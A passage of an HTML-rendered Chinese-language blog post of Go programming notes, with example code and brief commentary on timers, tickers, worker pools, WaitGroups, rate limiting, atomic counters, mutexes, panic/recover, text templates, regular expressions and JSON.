class="hljs-built_in">time</span>.<span class="hljs-built_in">Second</span> * <span class="hljs-number">2</span>)  <br>  <br>    &lt;-time1.C  <br>    fmt.Println(<span class="hljs-string">&quot;Timer 1 fired&quot;</span>)  <br>  <br>    timer2 := <span class="hljs-built_in">time</span>.NewTimer(<span class="hljs-built_in">time</span>.<span class="hljs-built_in">Second</span>)  <br>    go func() &#123;  <br>       &lt;-timer2.C  <br>       fmt.Println(<span class="hljs-string">&quot;Timer 2 fired&quot;</span>)  <br>    &#125;()  <br>    stop2 := timer2.Stop()  <br>    <span class="hljs-keyword">if</span> stop2 &#123;  <br>       fmt.Println(<span class="hljs-string">&quot;Timer 2 stopped&quot;</span>)  <br>    &#125;  <br>  <br>    <span class="hljs-built_in">time</span>.Sleep(<span class="hljs-built_in">time</span>.<span class="hljs-built_in">Second</span> * <span class="hljs-number">2</span>)  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Tickers"><a href="#Tickers" class="headerlink" title="Tickers"></a>Tickers</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;time&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    ticker := time.NewTicker(<span class="hljs-number">500</span> * time.Millisecond)  <br>    done := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)  <br>  <br>    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>  <br>       <span class="hljs-keyword">for</span> &#123;  <br>          <span class="hljs-keyword">select</span> &#123;  <br>          <span class="hljs-keyword">case</span> &lt;-done:  <br>             <span class="hljs-keyword">return</span>  <br>          <span class="hljs-keyword">case</span> t := &lt;-ticker.C:  <br>             fmt.Println(<span class="hljs-string">&quot;Tick at&quot;</span>, t)  <br>  <br>          &#125;  <br>       &#125;  <br>    &#125;()  <br>  <br>    time.Sleep(<span class="hljs-number">1600</span> * time.Millisecond)  <br>    ticker.Stop()  <br>    done &lt;- <span class="hljs-literal">true</span>  <br>    fmt.Println(<span class="hljs-string">&quot;Ticker Stopped&quot;</span>)  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><p>与 Timer 的区别在于，<code>tickers are for when you want to do something repeatly </code></p><h2 id="Worker-Pools"><a href="#Worker-Pools" class="headerlink" title="Worker Pools"></a>Worker Pools</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;time&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">worker</span><span class="hljs-params">(id <span class="hljs-type">int</span>, jobs &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, results <span class="hljs-keyword">chan</span>&lt;- <span class="hljs-type">int</span>)</span></span> &#123;  <br>    <span class="hljs-keyword">for</span> j := <span class="hljs-keyword">range</span> jobs &#123;  <br>       fmt.Println(<span class="hljs-string">&quot;worker&quot;</span>, id, <span class="hljs-string">&quot;started job&quot;</span>, j)  <br>       time.Sleep(time.Second)  <br>       fmt.Println(<span class="hljs-string">&quot;worker&quot;</span>, id, <span class="hljs-string">&quot;finished job&quot;</span>, j)  <br>       results &lt;- j * <span class="hljs-number">2</span>  <br>    &#125;  <br>&#125;  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    <span class="hljs-keyword">const</span> numJobs = <span class="hljs-number">5</span>  <br>    jobs := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, numJobs)  <br>    results := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, numJobs)  <br>  <br>    <span class="hljs-keyword">for</span> w := <span class="hljs-number">1</span>; w &lt;= <span class="hljs-number">3</span>; w++ &#123;  <br>       <span class="hljs-keyword">go</span> worker(w, jobs, results)  <br>  <br>    &#125;  <br>    <span class="hljs-keyword">for</span> j := <span class="hljs-number">1</span>; j &lt;= numJobs; j++ &#123;  <br>       jobs &lt;- j  <br>    &#125;  <br>    <span class="hljs-built_in">close</span>(jobs)  <br>    <span class="hljs-keyword">for</span> a := <span class="hljs-number">1</span>; a &lt;= numJobs; a++ &#123;  <br>       &lt;-results  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>jobs &lt;-chan int, results chan&lt;- int 分别为一个只读和只写的通道，虽然只启动了 3 个 worker 协程，但是向 jobs  通道发送了 5 个任务。这些任务会被这 3 个 worker 协程并发地处理。</p><h2 id="WaitGroups"><a href="#WaitGroups" class="headerlink" title="WaitGroups"></a>WaitGroups</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;sync&quot;</span>    <span class="hljs-string">&quot;time&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">worker</span><span class="hljs-params">(id <span class="hljs-type">int</span>)</span></span> &#123;  <br>    fmt.Println(<span class="hljs-string">&quot;worker starting &quot;</span>, id)  <br>    time.Sleep(time.Second)  <br>    fmt.Println(<span class="hljs-string">&quot;worker done &quot;</span>, id)  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    <span class="hljs-keyword">var</span> wg sync.WaitGroup  <br>  <br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">5</span>; i++ &#123;  <br>       wg.Add(<span class="hljs-number">1</span>)  <br>       <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>          <span class="hljs-keyword">defer</span> wg.Done()  <br>          worker(i)  <br>       &#125;()  <br>    &#125;  <br>    wg.Wait()  <br>&#125;<br></code></pre></td></tr></table></figure><p>使用 waitgroups 来等待所有 goroutines 完成。</p><h2 id="Rate-Limiting"><a href="#Rate-Limiting" class="headerlink" title="Rate Limiting"></a>Rate Limiting</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;time&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    requests := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">5</span>)  <br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">5</span>; i++ &#123;  <br>       requests &lt;- i  <br>    &#125;  <br>    <span class="hljs-built_in">close</span>(requests)  <br>  <br>    limiter := time.Tick(<span class="hljs-number">200</span> * time.Millisecond)  <br>    <span class="hljs-keyword">for</span> req := <span class="hljs-keyword">range</span> requests &#123;  <br>       &lt;-limiter  <br>       fmt.Println(<span class="hljs-string">&quot;request&quot;</span>, req, time.Now())  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>如果想限制速率，可以通过 time.Tick 设置一个 limiter。</p><h2 id="Atomic-Counters"><a href="#Atomic-Counters" class="headerlink" title="Atomic Counters"></a>Atomic Counters</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;sync&quot;</span>    <span class="hljs-string">&quot;sync/atomic&quot;</span>)  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>  <br>    <span class="hljs-keyword">var</span> ops atomic.Uint64  <br>  <br>    <span class="hljs-keyword">var</span> wg sync.WaitGroup  <br>  <br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">50</span>; i++ &#123;  <br>       wg.Add(<span class="hljs-number">1</span>)  <br>  <br>       <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>          <span class="hljs-keyword">for</span> c := <span class="hljs-number">0</span>; c &lt; <span class="hljs-number">1000</span>; c++ &#123;  <br>  <br>             ops.Add(<span class="hljs-number">1</span>)  <br>          &#125;  <br>  <br>          wg.Done()  <br>       &#125;()  <br>    &#125;  <br>  <br>    wg.Wait()  <br>  <br>    fmt.Println(<span class="hljs-string">&quot;ops:&quot;</span>, ops.Load())  <br>&#125;<br></code></pre></td></tr></table></figure><p>使用 load 来更新，线程安全。</p><h2 id="Mutexes"><a href="#Mutexes" class="headerlink" title="Mutexes"></a>Mutexes</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;fmt&quot;</span>  <br>    <span class="hljs-string">&quot;sync&quot;</span>)  <br>  <br><span class="hljs-keyword">type</span> Container <span class="hljs-keyword">struct</span> &#123;  <br>    mu       sync.Mutex  <br>    counters <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Container)</span></span> inc(name <span class="hljs-type">string</span>) &#123;  <br>  <br>    c.mu.Lock()  <br>    <span class="hljs-keyword">defer</span> c.mu.Unlock()  <br>    c.counters[name]++  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    c := Container&#123;  <br>  <br>       counters: <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">0</span>&#125;,  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">var</span> wg sync.WaitGroup  <br>  <br>    doIncrement := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(name <span class="hljs-type">string</span>, n <span class="hljs-type">int</span>)</span></span> &#123;  <br>       <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; n; i++ &#123;  <br>          c.inc(name)  <br>       &#125;  <br>       wg.Done()  <br>    &#125;  <br>  <br>    wg.Add(<span class="hljs-number">3</span>)  <br>    <span class="hljs-keyword">go</span> doIncrement(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">10000</span>)  <br>    <span class="hljs-keyword">go</span> doIncrement(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">10000</span>)  <br>    <span class="hljs-keyword">go</span> doIncrement(<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-number">10000</span>)  <br>  <br>    wg.Wait()  <br>    fmt.Println(c.counters)  <br>&#125;<br><br></code></pre></td></tr></table></figure><p>对于更复杂的场景，想要在多线程中安全地操作数据，可以利用 mutex。<br>在获取数据之前，先用 mutex 锁住，再通过 defer 进行 unlock。</p><h2 id="Panic"><a href="#Panic" class="headerlink" title="Panic"></a>Panic</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;os&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    <span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot; a problem&quot;</span>)  <br>  <br>    _, err := os.Create(<span class="hljs-string">&quot;/tmp/file&quot;</span>)  <br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  <br>       <span class="hljs-built_in">panic</span>(err)  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Recover"><a href="#Recover" class="headerlink" title="Recover"></a>Recover</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span>  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">myPanic</span><span class="hljs-params">()</span></span> &#123;  <br>    <span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;a problem&quot;</span>)  <br>  <br>&#125;  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>    <span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>       <span class="hljs-keyword">if</span> r := <span class="hljs-built_in">recover</span>(); r != <span class="hljs-literal">nil</span> &#123;  <br>          fmt.Println(<span class="hljs-string">&quot;revocered. Error &quot;</span>, r)  <br>       &#125;  <br>    &#125;()  <br>    myPanic()  <br>    fmt.Println(<span class="hljs-string">&quot;After mypanic()&quot;</span>)  <br>&#125;<br></code></pre></td></tr></table></figure><p>Go 可以通过 recover 函数从 panic 中恢复，可以阻止 panic 中止程序，让它继续执行。<br>例如下面的场景：<br>如果其中一个客户端连接出现严重错误，服务器不希望崩溃。而是希望关闭该连接并继续为其他客户端提供服务。<br>recover 必须在 defer 函数中调用。</p><h2 id="Text-Templates"><a href="#Text-Templates" class="headerlink" title="Text Templates"></a>Text Templates</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    <span class="hljs-string">&quot;os&quot;</span>  <br>    <span class="hljs-string">&quot;text/template&quot;</span>)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>  <br>    t1 := template<span class="hljs-selector-class">.New</span>(<span class="hljs-string">&quot;t1&quot;</span>)  <br>    t1, err := t1<span class="hljs-selector-class">.Parse</span>(<span class="hljs-string">&quot;Value is &#123;&#123;.&#125;&#125;\n&quot;</span>)  <br>    <span class="hljs-keyword">if</span> err != nil &#123;  <br>       <span class="hljs-built_in">panic</span>(err)  <br>    &#125;  <br>  <br>    t1 = template<span class="hljs-selector-class">.Must</span>(t1<span class="hljs-selector-class">.Parse</span>(<span class="hljs-string">&quot;Value: &#123;&#123;.&#125;&#125;\n&quot;</span>))  <br>  <br>    t1<span class="hljs-selector-class">.Execute</span>(os<span class="hljs-selector-class">.Stdout</span>, <span class="hljs-string">&quot;some text&quot;</span>)  <br>    t1<span class="hljs-selector-class">.Execute</span>(os<span class="hljs-selector-class">.Stdout</span>, <span class="hljs-number">5</span>)  <br>    t1<span class="hljs-selector-class">.Execute</span>(os<span class="hljs-selector-class">.Stdout</span>, <span class="hljs-selector-attr">[]</span>string&#123;  <br>       <span class="hljs-string">&quot;Go&quot;</span>,  <br>       <span class="hljs-string">&quot;Rust&quot;</span>,  <br>       <span class="hljs-string">&quot;C++&quot;</span>,  <br>       <span class="hljs-string">&quot;C#&quot;</span>,  <br>    &#125;)  <br>  <br>    Create := <span class="hljs-built_in">func</span>(name, t string) *template<span class="hljs-selector-class">.Template</span> &#123;  <br>       return template<span class="hljs-selector-class">.Must</span>(template<span class="hljs-selector-class">.New</span>(name)<span class="hljs-selector-class">.Parse</span>(t))  <br>    &#125;  <br>  <br>    t2 := <span class="hljs-built_in">Create</span>(<span class="hljs-string">&quot;t2&quot;</span>, <span class="hljs-string">&quot;Name: &#123;&#123;.Name&#125;&#125;\n&quot;</span>)  <br>  <br>    t2<span class="hljs-selector-class">.Execute</span>(os<span class="hljs-selector-class">.Stdout</span>, struct &#123;  <br>       Name string  <br>    &#125;&#123;<span class="hljs-string">&quot;Jane Doe&quot;</span>&#125;)  <br>  <br>    t2<span class="hljs-selector-class">.Execute</span>(os<span class="hljs-selector-class">.Stdout</span>, map<span class="hljs-selector-attr">[string]</span>string&#123;  <br>       <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;Mickey Mouse&quot;</span>,  <br>    &#125;)  <br>  <br>    t3 := <span class="hljs-built_in">Create</span>(<span class="hljs-string">&quot;t3&quot;</span>,  <br>       <span class="hljs-string">&quot;&#123;&#123;if . -&#125;&#125; yes &#123;&#123;else -&#125;&#125; no &#123;&#123;end&#125;&#125;\n&quot;</span>)  <br>    t3<span class="hljs-selector-class">.Execute</span>(os<span class="hljs-selector-class">.Stdout</span>, <span class="hljs-string">&quot;not empty&quot;</span>)  <br>    t3<span class="hljs-selector-class">.Execute</span>(os<span class="hljs-selector-class">.Stdout</span>, <span class="hljs-string">&quot;&quot;</span>)  <br>  <br>    t4 := <span class="hljs-built_in">Create</span>(<span class="hljs-string">&quot;t4&quot;</span>,  <br>       <span class="hljs-string">&quot;Range: &#123;&#123;range .&#125;&#125;&#123;&#123;.&#125;&#125; &#123;&#123;end&#125;&#125;\n&quot;</span>)  <br>    t4<span class="hljs-selector-class">.Execute</span>(os<span class="hljs-selector-class">.Stdout</span>,  <br>       <span class="hljs-selector-attr">[]</span>string&#123;  <br>          <span class="hljs-string">&quot;Go&quot;</span>,  <br>          <span class="hljs-string">&quot;Rust&quot;</span>,  <br>          <span class="hljs-string">&quot;C++&quot;</span>,  <br>          <span class="hljs-string">&quot;C#&quot;</span>,  <br>       &#125;)  <br>&#125;<br></code></pre></td></tr></table></figure><p>展示动态内容或自定义输入。</p><h2 id="Regular-Expressions"><a href="#Regular-Expressions" class="headerlink" title="Regular Expressions"></a>Regular Expressions</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs css">package <span class="hljs-selector-tag">main</span>  <br>  <br>import (  <br>    &quot;fmt&quot;  <br>    &quot;regexp&quot;)  <br>  <br>func <span class="hljs-selector-tag">main</span>() &#123;  <br>    match, _ := regexp.<span class="hljs-built_in">MatchString</span>(<span class="hljs-string">&quot;p([a-z]+)ch&quot;</span>, <span class="hljs-string">&quot;peach&quot;</span>)  <br>    fmt.<span class="hljs-built_in">Println</span>(match)  <br>  <br>    r, _ := regexp.<span class="hljs-built_in">Compile</span>(<span class="hljs-string">&quot;p([a-z]+)ch&quot;</span>)  <br>    fmt.<span class="hljs-built_in">Println</span>(r.<span class="hljs-built_in">MatchString</span>(<span class="hljs-string">&quot;peach&quot;</span>))  <br>    fmt.<span class="hljs-built_in">Println</span>(r.<span class="hljs-built_in">FindString</span>(<span class="hljs-string">&quot;peach punch&quot;</span>))  <br>    fmt.<span class="hljs-built_in">Println</span>(r.<span class="hljs-built_in">FindStringIndex</span>(<span class="hljs-string">&quot;peach punch&quot;</span>))  <br>    fmt.<span class="hljs-built_in">Println</span>(r.<span class="hljs-built_in">FindStringSubmatch</span>(<span class="hljs-string">&quot;peach punch&quot;</span>))  <br>    fmt.<span class="hljs-built_in">Println</span>(r.<span class="hljs-built_in">FindStringSubmatchIndex</span>(<span class="hljs-string">&quot;peach punch&quot;</span>))  <br>    fmt.<span class="hljs-built_in">Println</span>(r.<span class="hljs-built_in">FindAllString</span>(<span class="hljs-string">&quot;peach punch pinch&quot;</span>, -<span class="hljs-number">1</span>))  <br>    fmt.<span class="hljs-built_in">Println</span>(r.<span class="hljs-built_in">FindAllString</span>(<span class="hljs-string">&quot;peach punch pinch&quot;</span>, <span class="hljs-number">0</span>))  <br>    fmt.<span class="hljs-built_in">Println</span>(r.<span class="hljs-built_in">FindAllString</span>(<span class="hljs-string">&quot;peach punch pinch&quot;</span>, <span class="hljs-number">1</span>))  <br>    fmt.<span class="hljs-built_in">Println</span>(r.<span class="hljs-built_in">FindAllString</span>(<span class="hljs-string">&quot;peach punch pinch&quot;</span>, <span class="hljs-number">2</span>))  <br>&#125;<br></code></pre></td></tr></table></figure><p>使用正则表达式创建全局变量时，最好用 MustCompile ，因为 MustCompile 会返回 panic 而不是返回错误，这使得用于全局变量更安全。</p><h2 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main  <br>  <br><span class="hljs-keyword">import</span> (  <br>    <span class="hljs-string">&quot;encoding/json&quot;</span>  <br>    <span class="hljs-string">&quot;fmt&quot;</span>    <span class="hljs-string">&quot;os&quot;</span>)  <br>  <br><span class="hljs-keyword">type</span> response1 <span class="hljs-keyword">struct</span> &#123;  <br>    Page   <span class="hljs-type">int</span>  <br>    Fruits []<span class="hljs-type">string</span>  <br>&#125;  <br>  <br><span class="hljs-keyword">type</span> response2 <span class="hljs-keyword">struct</span> &#123;  <br>    Page   <span class="hljs-type">int</span>      <span class="hljs-string">`json:&quot;page&quot;`</span>  <br>    Fruits []<span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;fruits&quot;`</span>  <br>&#125;  <br>  <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  <br>  <br>    slcD := []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;peach&quot;</span>, <span class="hljs-string">&quot;pear&quot;</span>&#125;  <br>    slcB, _ := json.Marshal(slcD)  <br>    fmt.Println(<span class="hljs-type">string</span>(slcB))  <br>  <br>    mapD := <span 